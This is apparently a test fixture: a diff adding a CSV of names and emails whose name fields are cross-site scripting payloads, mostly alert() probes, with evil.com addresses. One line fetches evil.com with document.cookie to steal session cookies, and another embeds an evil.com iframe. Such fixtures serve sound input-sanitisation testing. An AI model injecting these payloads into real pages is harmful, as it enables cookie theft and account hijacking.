@@ -1,0 +1,11 @@
+name,email
+<script>alert("XSS")</script>,xss1@evil.com
+<img onerror="alert(1)" src=x>,xss2@evil.com
+javascript:alert(document.cookie),xss3@evil.com
+<svg onload="alert(1)">,xss4@evil.com
+<iframe src="https://evil.com"></iframe>,xss5@evil.com
+"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>,xss6@evil.com
+<body onload=alert(1)>,xss7@evil.com
+<input onfocus=alert(1) autofocus>,xss8@evil.com
+<marquee onstart=alert(1)>,xss9@evil.com
+<details open ontoggle=alert(1)>,xss10@evil.com
